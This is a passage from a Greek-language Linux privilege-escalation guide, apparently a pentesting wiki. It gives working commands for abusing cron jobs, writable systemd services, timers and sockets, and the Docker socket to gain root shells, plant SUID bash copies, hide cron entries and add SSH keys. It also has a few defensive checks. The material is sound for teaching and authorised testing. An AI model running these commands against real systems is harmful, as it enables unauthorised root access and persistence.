#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron που χρησιμοποιεί script με wildcard (Wildcard Injection)

Αν ένα script εκτελείται από τον root και περιέχει ένα «**\***» μέσα σε μια εντολή, θα μπορούσες να το εκμεταλλευτείς για να προκαλέσεις απρόσμενα πράγματα (όπως privesc). Παράδειγμα:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Αν το wildcard προηγείται από μια διαδρομή, όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε το** _**./\***_ **).**

Διάβασε την ακόλουθη σελίδα για επιπλέον κόλπα εκμετάλλευσης wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection αριθμητικής επέκτασης Bash σε cron log parsers

Η αριθμητική Bash μπορεί να ερμηνεύσει μη έμπιστο κείμενο ως έκφραση. Σε επηρεαζόμενα περιβάλλοντα Bash, ένας δείκτης πίνακα μέσα σε αυτή την έκφραση μπορεί να αξιολογήσει ένα command substitution. Αν ένας προνομιούχος cron/parser τοποθετήσει κείμενο log που ελέγχεται από τον επιτιθέμενο σε μια τέτοια αριθμητική σύγκριση, το substitution μπορεί να εκτελεστεί με την ταυτότητα του parser.<sup>[[22]](#references)</sup> Αυτό εξαρτάται από την ακριβή έκφραση Bash και την έκδοση· μια απλή συμβολοσειρά `$(...)0` σε μια επεκτεινόμενη μεταβλητή δεν αποτελεί από μόνη της αξιόπιστη επίδειξη επανεκτέλεσης.

Η είσοδος μπορεί επίσης να προέρχεται από μεταδεδομένα αρχείων ή από άλλο πεδίο που διαβάζεται από μια τοποθεσία εγγράψιμη από χρήστη. Για παράδειγμα, ένα προνομιούχο script καθαρισμού που διαβάζει ένα tag `Producer` εικόνας και το συγκρίνει με `[[ "$producer" -eq "expected" ]]` εκτελεί αριθμητική σύγκριση, παρότι η μεταβλητή βρίσκεται μέσα σε εισαγωγικά. Εντόπισε την ταυτότητα χρήστη με την οποία εκτελείται η προγραμματισμένη εργασία, ποια αρχεία μπορούν να παρέχουν το tag, τυχόν μετασχηματισμούς πριν από τη σύγκριση και την ακριβή συμπεριφορά της Bash. Για ετικέτες κειμένου, χρησιμοποίησε σύγκριση συμβολοσειρών· για αριθμούς, επικύρωσε ότι η είσοδος αποτελείται από δεκαδικά ψηφία πριν από την αριθμητική πράξη. Δες τους [κανόνες αριθμητικής της Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Τυπικό ευάλωτο μοτίβο:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Ασφαλής τοπική διερεύνηση της συμπεριφοράς του μηχανισμού array-subscript (χωρίς προνομιούχα διεργασία ή αλλαγή αρχείου):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Εντοπίστε το πραγματικό προγραμματισμένο script και την κυριολεκτική διαδρομή εισόδου που ανοίγει. Ακόμα κι αν το ίδιο το αρχείο log δεν είναι εγγράψιμο, ένας χρήστης που μπορεί να γράψει και να διασχίσει τον μη sticky γονικό κατάλογό του ενδέχεται να μπορεί να αντικαταστήσει την εγγραφή του στον κατάλογο· το `namei -l` βοηθά να διακρίνετε αυτά τα δικαιώματα. Μια διαφορετική εγγράψιμη διαδρομή log, ένας μη αναγνώσιμος scheduler ή ένας parser που δεν αξιολογεί ποτέ αυτό το πεδίο ως αριθμητική έκφραση Bash δεν αποδεικνύει ότι ισχύει αυτή η διαδρομή.

### Αντικατάσταση cron script και symlink

Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από τον root, μπορείτε να αποκτήσετε shell πολύ εύκολα:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **κατάλογο στον οποίο έχεις πλήρη πρόσβαση**, ίσως θα ήταν χρήσιμο να διαγράψεις αυτόν τον φάκελο και να **δημιουργήσεις έναν φάκελο symlink προς έναν άλλο**, που θα περιέχει ένα script ελεγχόμενο από εσένα.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Επικύρωση συμβολικών συνδέσμων και ασφαλέστερος χειρισμός αρχείων

Κατά τον έλεγχο προνομιούχων scripts/δυαδικών αρχείων που διαβάζουν ή γράφουν αρχεία μέσω διαδρομής, επαληθεύστε πώς γίνεται ο χειρισμός των συνδέσμων:

- Η `stat()` ακολουθεί έναν συμβολικό σύνδεσμο και επιστρέφει τα μεταδεδομένα του στόχου.
- Η `lstat()` επιστρέφει τα μεταδεδομένα του ίδιου του συνδέσμου.
- Οι `readlink -f` και `namei -l` βοηθούν στον εντοπισμό του τελικού στόχου και εμφανίζουν τα δικαιώματα κάθε στοιχείου της διαδρομής.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Για defenders/developers, ασφαλέστερα μοτίβα απέναντι σε τεχνάσματα με symlink περιλαμβάνουν:

- `O_EXCL` με `O_CREAT`: αποτυγχάνει αν η διαδρομή υπάρχει ήδη (μπλοκάρει συνδέσμους/αρχεία που έχει δημιουργήσει εκ των προτέρων ο επιτιθέμενος).
- `openat()`: λειτουργεί σχετικά με ένα έμπιστο file descriptor καταλόγου.
- `mkstemp()`: δημιουργεί προσωρινά αρχεία ατομικά, με ασφαλή δικαιώματα.

### Προσαρμοσμένα υπογεγραμμένα cron binaries με εγγράψιμα payloads
Ένας συνηθισμένος χρήστης που μπορεί να γράψει στο ακριβές binary που εκτελείται από μια cron job του root μπορεί να διασχίσει ένα όριο προνομίων, αλλά ένας προσαρμοσμένος έλεγχος υπογραφής μπορεί να απορρίψει ένα unsigned replacement. Στην τεκμηριωμένη περίπτωση, το ELF ανήκε στον root και είχε mode `0760`, επιτρέποντας σε ένα μέλος της ομάδας του να το τροποποιήσει, ενώ ο ιδιοκτήτης root μπορούσε να το εκτελέσει. Ένα ορατό process trace έδειξε ότι το `objcopy` εξήγαγε το `.text_sig` πριν η job εκτελέσει το binary· το πλήρες verifier script δεν ήταν αναγνώσιμο.<sup>[[2]](#references)</sup>

Το replacement που πέτυχε υπογράφηκε με leaked ιδιωτικό υλικό υπογραφής, χρησιμοποιώντας έναν ELF signer. Η [τεκμηρίωση της μορφής](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) περιγράφει ένα signature section που προκύπτει από το `.text` του εκτελέσιμου. Δεν αποδεικνύεται ότι αρκεί απλώς η προσθήκη ενός certificate ή μιας συμβολοσειράς που ταιριάζει στο `.text_sig` για να ικανοποιηθεί ο μη ορατός verifier. Ελέγξτε την πραγματική προγραμματισμένη διαδρομή, την αποτελεσματική δυνατότητα εγγραφής, την εκτέλεση από τον root και την πολιτική του verifier πριν καταλήξετε ότι ένα εγγράψιμο υπογεγραμμένο binary είναι εκμεταλλεύσιμο. Ένα section `.text_sig` από μόνο του αποτελεί μόνο ένδειξη για περαιτέρω έλεγχο.

### Συχνές cron jobs

Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε ποιες εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσετε να το εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας.

Για παράδειγμα, για **παρακολούθηση κάθε 0.1s επί 1 λεπτό**, **ταξινόμηση με βάση τις λιγότερο συχνά εκτελούμενες εντολές** και αφαίρεση των εντολών που εκτελέστηκαν τις περισσότερες φορές, μπορείτε να κάνετε:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (θα παρακολουθεί και θα εμφανίζει κάθε διεργασία που ξεκινά).

### Backups από root που διατηρούν τα mode bits που όρισε ο επιτιθέμενος (pg_basebackup)

Αν ένα cron που εκτελείται ως root χρησιμοποιεί το `pg_basebackup` (ή οποιαδήποτε αναδρομική αντιγραφή) σε έναν κατάλογο βάσης δεδομένων στον οποίο έχετε δικαίωμα εγγραφής, μπορείτε να τοποθετήσετε ένα **SUID/SGID binary**, το οποίο θα αντιγραφεί ξανά ως **root:root**, με τα ίδια mode bits, στον προορισμό του backup.<sup>[[26]](#references)</sup>

Τυπική διαδικασία εντοπισμού (ως χρήστης DB με χαμηλά προνόμια):
- Χρησιμοποιήστε το `pspy` για να εντοπίσετε ένα cron του root που εκτελεί κάθε λεπτό κάτι σαν `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Επιβεβαιώστε ότι μπορείτε να γράψετε στο source cluster (π.χ., `/var/lib/postgresql/14/main`) και ότι ο προορισμός (`/opt/backups/current`) γίνεται ιδιοκτησία του root μετά την εκτέλεση της εργασίας.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bit δικαιωμάτων αρχείων κατά την αντιγραφή του cluster· όταν εκτελείται από τον root, τα αρχεία προορισμού αποκτούν **ιδιοκτησία root + SUID/SGID που έχει επιλέξει ο επιτιθέμενος**. Κάθε παρόμοια προνομιούχα ρουτίνα backup/αντιγραφής που διατηρεί τα δικαιώματα και γράφει σε μια εκτελέσιμη τοποθεσία είναι ευάλωτη.

### Αόρατες cron jobs

Είναι δυνατό να δημιουργηθεί μια cronjob **βάζοντας έναν χαρακτήρα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και η cron job θα λειτουργήσει. Παράδειγμα (προσέξτε τον χαρακτήρα carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Για να εντοπίσετε αυτού του είδους την κρυφή εγγραφή, επιθεωρήστε τα αρχεία cron με εργαλεία που εμφανίζουν χαρακτήρες ελέγχου:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Υπηρεσίες

### Εγγράψιμα αρχεία _.service_

Έλεγξε αν μπορείς να γράψεις σε κάποιο αρχείο `.service`. Αν μπορείς, **θα μπορούσες να το τροποποιήσεις** ώστε να **εκτελεί** το **backdoor σου όταν** η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένεις μέχρι να γίνει επανεκκίνηση του μηχανήματος).\
Για παράδειγμα, δημιούργησε το backdoor σου μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα εκτελέσιμα αρχεία υπηρεσιών

Λάβε υπόψη ότι αν έχεις **δικαιώματα εγγραφής σε εκτελέσιμα αρχεία που εκτελούνται από υπηρεσίες**, μπορείς να τα αντικαταστήσεις με backdoors, ώστε όταν οι υπηρεσίες εκτελεστούν ξανά, να εκτελεστούν και τα backdoors.

### systemd PATH - Σχετικές διαδρομές

Μπορείς να δεις το PATH που χρησιμοποιεί το **systemd** με:

```bash
systemctl show-environment
```

Αν διαπιστώσετε ότι μπορείτε να κάνετε **εγγραφή** σε οποιονδήποτε από τους φακέλους της διαδρομής, ίσως μπορέσετε να **κλιμακώσετε τα προνόμιά σας**. Πρέπει να αναζητήσετε αρχεία **ρυθμίσεων υπηρεσιών που χρησιμοποιούν σχετικές διαδρομές**, όπως:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με το **ίδιο όνομα με το δυαδικό αρχείο της σχετικής διαδρομής** μέσα στον φάκελο systemd PATH στον οποίο έχετε δικαίωμα εγγραφής. Όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), θα εκτελεστεί το **backdoor** σας (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να εκκινούν ή να διακόπτουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε το `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με την εντολή `man systemd.service`.**

## **Χρονοδιακόπτες**

Τα **Χρονοδιακόπτες** είναι αρχεία μονάδων systemd των οποίων το όνομα τελειώνει σε `**.timer**` και τα οποία ελέγχουν αρχεία `**.service**` ή συμβάντα. Οι **Χρονοδιακόπτες** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση στο cron, καθώς διαθέτουν ενσωματωμένη υποστήριξη για συμβάντα ημερολογιακού και μονοτονικού χρόνου και μπορούν να εκτελούνται ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονοδιακόπτες με:

```bash
systemctl list-timers --all
```

### Εγγράψιμοι χρονοδιακόπτες

Αν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελεί υπάρχουσες μονάδες του systemd.unit (όπως ένα `.service` ή ένα `.target`).

```bash
Unit=backdoor.service
```

Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτός ο χρονοδιακόπτης. Το όρισμα είναι ένα όνομα μονάδας, χωρίς την κατάληξη ".timer". Αν δεν καθοριστεί, αυτή η τιμή είναι από προεπιλογή μια υπηρεσία με το ίδιο όνομα με τη μονάδα χρονοδιακόπτη, χωρίς την κατάληξη. (Βλ. παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας χρονοδιακόπτη να είναι πανομοιότυπα, εκτός από την κατάληξη.

Επομένως, για να καταχραστείτε αυτό το δικαίωμα, θα χρειαστεί να:

- Βρείτε κάποια μονάδα systemd (όπως ένα `.service`) που **εκτελεί ένα εγγράψιμο binary**
- Βρείτε κάποια μονάδα systemd που **εκτελεί μια σχετική διαδρομή** και να έχετε **δικαιώματα εγγραφής στο systemd PATH** (για να υποδυθείτε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους χρονοδιακόπτες με `man systemd.timer`.**

### **Ενεργοποίηση χρονοδιακόπτη**

Για να ενεργοποιήσετε έναν χρονοδιακόπτη, χρειάζεστε δικαιώματα root και να εκτελέσετε:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Σημειώστε ότι το **timer** **ενεργοποιείται** δημιουργώντας έναν συμβολικό σύνδεσμο προς αυτό στη διαδρομή `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** στο ίδιο ή σε διαφορετικά μηχανήματα, στο πλαίσιο μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία περιγραφέων Unix για επικοινωνία μεταξύ υπολογιστών και διαμορφώνονται μέσω αρχείων `.socket`.<sup>[[14]](#references)</sup>

Τα Sockets μπορούν να διαμορφωθούν μέσω αρχείων `.socket`.

**Μάθετε περισσότερα για τα sockets με την εντολή `man systemd.socket`.** Μέσα σε αυτό το αρχείο μπορούν να διαμορφωθούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν μεταξύ τους, αλλά συνοπτικά **καθορίζουν σε ποια διεύθυνση θα ακούει** το socket (τη διαδρομή του αρχείου socket AF_UNIX, τη διεύθυνση IPv4/6 ή/και τον αριθμό θύρας όπου θα ακούει κ.λπ.)
- `Accept`: Δέχεται μια δυαδική τιμή. Αν είναι **true**, **δημιουργείται ένα instance της υπηρεσίας για κάθε εισερχόμενη σύνδεση** και σε αυτό μεταβιβάζεται μόνο το socket σύνδεσης. Αν είναι **false**, όλα τα ίδια τα sockets ακρόασης **μεταβιβάζονται στη μονάδα υπηρεσίας που εκκινείται** και δημιουργείται μόνο μία μονάδα υπηρεσίας για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για sockets datagram και FIFOs, όπου μία μονάδα υπηρεσίας χειρίζεται πάντα όλη την εισερχόμενη κίνηση. **Προεπιλογή: false**. Για λόγους απόδοσης, συνιστάται η συγγραφή νέων daemons με τρόπο που να είναι κατάλληλος για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά**, αντίστοιχα, από τη **δημιουργία** και τη δέσμευση των sockets/FIFOs ακρόασης. Το πρώτο token της γραμμής εντολών πρέπει να είναι απόλυτο όνομα αρχείου και να ακολουθούν τα ορίσματα της διεργασίας.
- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά**, αντίστοιχα, από το **κλείσιμο** και την αφαίρεση των sockets/FIFOs ακρόασης.
- `Service`: Καθορίζει το όνομα της μονάδας **υπηρεσίας που θα ενεργοποιηθεί** με **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Ως προεπιλογή, χρησιμοποιείται η υπηρεσία με το ίδιο όνομα με το socket (με αντικατάσταση της κατάληξης). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να χρειάζεται να χρησιμοποιήσετε αυτήν την επιλογή.

### Εγγράψιμα αρχεία .socket

Αν εντοπίσετε ένα **εγγράψιμο** αρχείο `.socket`, μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor`, και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί τη διαμόρφωση αυτού του αρχείου socket, διαφορετικά το backdoor δεν θα εκτελεστεί_

### Ενεργοποίηση socket + εγγράψιμη διαδρομή μονάδας (δημιουργία υπηρεσίας που λείπει)

Μια άλλη σημαντική λανθασμένη διαμόρφωση είναι η εξής:

- μια μονάδα socket με `Accept=no` και `Service=<name>.service`
- η αναφερόμενη μονάδα υπηρεσίας δεν υπάρχει
- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη διαδρομή αναζήτησης μονάδων)

Σε αυτήν την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service` και, στη συνέχεια, να προκαλέσει κίνηση προς το socket, ώστε το systemd να φορτώσει και να εκτελέσει τη νέα υπηρεσία ως root.

Γρήγορη ροή:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Εγγράψιμα sockets

Αν **εντοπίσεις κάποιο εγγράψιμο socket** (_εδώ μιλάμε για Unix Sockets και όχι για αρχεία ρυθμίσεων `.socket`_), τότε **μπορείς να επικοινωνήσεις** με αυτό το socket και ίσως να εκμεταλλευτείς κάποια ευπάθεια.

### Απαρίθμηση Unix Sockets

```bash
netstat -a -p --unix
```

### Ακατέργαστη σύνδεση

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets που ακούν για αιτήματα HTTP** (_δεν αναφέρομαι σε αρχεία .socket, αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Αν το socket **απαντήσει με ένα HTTP** request, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλίζεται. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η δυνατότητα εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του τρόπου με τον οποίο μπορεί να γίνει αυτό, καθώς και εναλλακτικών μεθόδων αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation με το Docker CLI**

Αν έχετε δικαίωμα εγγραφής στο Docker socket, μπορείτε να κλιμακώσετε τα προνόμιά σας χρησιμοποιώντας τις ακόλουθες εντολές:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Αυτές οι εντολές σάς επιτρέπουν να εκτελέσετε ένα container με πρόσβαση στο σύστημα αρχείων του host σε επίπεδο root.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, μπορείτε και πάλι να καταχραστείτε το Docker socket χρησιμοποιώντας ακατέργαστο HTTP μέσω του Unix socket. Η πιο αξιόπιστη διαδικασία είναι:

- δημιουργήστε ένα helper container μακράς διάρκειας με bind mount του root του host
- εκκινήστε το
- δημιουργήστε μια παρουσία `exec` μέσα σε αυτό το helper
- εκκινήστε την παρουσία `exec` και διαβάστε την έξοδο μέσω του API

**Λίστα εικόνων Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Δημιουργήστε και εκκινήστε ένα βοηθητικό container**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Δημιουργήστε ένα exec instance**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Εκκινήστε το exec instance και διαβάστε την έξοδο**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Αυτό το μοτίβο είναι συνήθως πιο αξιόπιστο από το να προσπαθήσεις να χειριστείς χειροκίνητα το `attach` με `socat` ή `nc -U`. Μόλις μπορέσεις να δημιουργήσεις ένα helper με `/:/host`, μπορείς να χρησιμοποιήσεις επιπλέον instances του `exec` για να διαβάσεις αρχεία όπως `/host/root/...`, να προσθέσεις SSH keys στο `/host/root/.ssh` ή να τροποποιήσεις αρχεία εκκίνησης του host.

### Άλλα

Σημείωσε ότι αν έχεις δικαιώματα εγγραφής στο docker socket επειδή **ανήκεις στην ομάδα `docker`**, έχεις [**περισσότερους τρόπους για να κλιμακώσεις τα προνόμιά σου**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε μια θύρα**, μπορείς επίσης να το παραβιάσεις](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δες **περισσότερους τρόπους διαφυγής από containers ή κατάχρησης των container runtimes για κλιμάκωση προνομίων** εδώ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Κλιμάκωση προνομίων μέσω Containerd (ctr)

Αν διαπιστώσεις ότι μπορείς να χρησιμοποιήσεις την εντολή **`ctr`**, διάβασε την παρακάτω σελίδα, καθώς **ενδέχεται να μπορείς να την καταχραστείς για να κλιμακώσεις προνόμια**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Κλιμάκωση προνομίων μέσω **RunC**

Αν διαπιστώσεις ότι μπορείς να χρησιμοποιήσεις την εντολή **`runc`**, διάβασε την παρακάτω σελίδα, καθώς **ενδέχεται να μπορείς να την καταχραστείς για να κλιμακώσεις προνόμια**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο **σύστημα επικοινωνίας μεταξύ διεργασιών (IPC)**, που επιτρέπει στις εφαρμογές να επικοινωνούν και να ανταλλάσσουν δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα τα σύγχρονα συστήματα Linux, προσφέρει ένα ισχυρό πλαίσιο για διαφορετικές μορφές επικοινωνίας μεταξύ εφαρμογών.<sup>[[16]](#references)</sup>

Το σύστημα είναι ευέλικτο και υποστηρίζει βασικό IPC, το οποίο διευκολύνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας **βελτιωμένα UNIX domain sockets**. Επιπλέον, συμβάλλει στη μετάδοση συμβάντων ή σημάτων, διευκολύνοντας την απρόσκοπτη ενσωμάτωση των στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από έναν δαίμονα Bluetooth για εισερχόμενη κλήση μπορεί να προκαλέσει τη σίγαση ενός music player, βελτιώνοντας την εμπειρία του χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών και διευκολύνοντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.

Το D-Bus λειτουργεί με ένα **μοντέλο allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) βάσει της συνδυαστικής επίδρασης των κανόνων πολιτικής που αντιστοιχούν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν την κλιμάκωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρακάτω παρουσιάζεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, όπου περιγράφονται λεπτομερώς τα δικαιώματα του χρήστη root να κατέχει το `fi.w1.wpa_supplicant1`, να του στέλνει μηνύματα και να λαμβάνει μηνύματα από αυτό.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές του πλαισίου "default" ισχύουν για όσα δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Μάθετε εδώ πώς να κάνετε enumerate και exploit μια επικοινωνία D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να κάνετε enumerate το δίκτυο και να προσδιορίσετε τη θέση του μηχανήματος.

### Γενικό enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

